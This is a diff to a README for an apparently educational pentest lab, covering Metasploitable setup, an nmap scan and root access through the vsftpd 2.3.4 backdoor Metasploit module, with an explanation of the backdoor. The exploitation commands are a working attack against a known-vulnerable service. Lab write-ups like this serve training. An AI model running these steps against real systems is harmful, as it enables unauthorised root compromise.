@@ -28,3 +28,95 @@ Download from: https://sourceforge.net/projects/metasploitable/
 Extract the ZIP file. You will find a `.vmdk` disk image inside.
 
 ### Step 3 — Create a new VM in VirtualBox
+### Step 4 — Set network adapter to Host-Only
+> ⚠️ This step is critical. Without it, Kali and Metasploitable cannot
+> communicate with each other.
+
+### Step 5 — Boot and confirm IP
+Log in with: `msfadmin / msfadmin`
+```bash
+ifconfig
+```
+Look for `eth0 inet addr` — this is your target IP.
+In this lab: **192.168.56.101**
+
+---
+
+## Lab Walkthrough
+
+### Phase 1 — Reconnaissance
+```bash
+nmap -A -T4 192.168.56.101
+```
+**Key services discovered:**
+| Port | Service | Version | Risk |
+|------|---------|---------|------|
+| 21/tcp | FTP | vsftpd 2.3.4 | Critical — backdoor |
+| 22/tcp | SSH | OpenSSH 4.7p1 | High — outdated |
+| 23/tcp | Telnet | Linux telnetd | High — cleartext |
+| 80/tcp | HTTP | Apache 2.2.8 | Medium |
+| 139/445/tcp | SMB | Samba 3.X–4.X | High — signing disabled |
+| 1524/tcp | shell | Metasploitable root shell | Critical |
+| 3306/tcp | MySQL | 5.0.51a | High — exposed DB |
+| 5900/tcp | VNC | Protocol 3.3 | High |
+| 6667/tcp | IRC | UnrealIRCd | Critical — backdoor |
+
+OS: Linux 2.6.X | Hostname: metasploitable | Distance: 1 hop
+
+---
+
+### Phase 2 — Finding the Exploit
+```bash
+searchsploit vsftpd 2.3.4
+```
+**Result:**
+
+---
+
+### Phase 3 — Exploitation with Metasploit
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.102
+set RPORT 21
+exploit
+```
+**Output:**
+
+---
+
+### Phase 4 — Post-Exploitation Verification
+```bash
+whoami      # → root
+hostname    # → metasploitable
+ifconfig    # → 192.168.56.101 confirmed
+```
+
+---
+
+## How the Backdoor Works
+The vsftpd 2.3.4 backdoor was maliciously inserted into the source code in
+2011. When a user logs in with a username containing `:)` (a smiley face),
+the server opens a listening shell on **port 6200** with root privileges.
+The attacker then connects to port 6200 and has an unrestricted root shell.
+
+---
+
+## Key Takeaways
+- Over 20 vulnerable services were running simultaneously on a default
+  Metasploitable install — any one of them could lead to full compromise.
+- The entire exploit from `msfconsole` to root shell took under 2 minutes.
+- The LHOST warning "Unknown datastore option: LHOST. Did you mean RHOST?"
+  appears for this particular module because it uses a bind shell (port 6200
+  opens on the target) rather than a reverse shell. LHOST is not needed.
+- Post-exploitation verification (whoami, hostname, ifconfig) is standard
+  practice to confirm scope and access level before proceeding.
+
+---
+
+## Files in This Folder
+| File | Description |
+|------|-------------|
+| `Task3_Saturday_Lab.docx` | Full report with all screenshots |
+| `README.md` | This file |
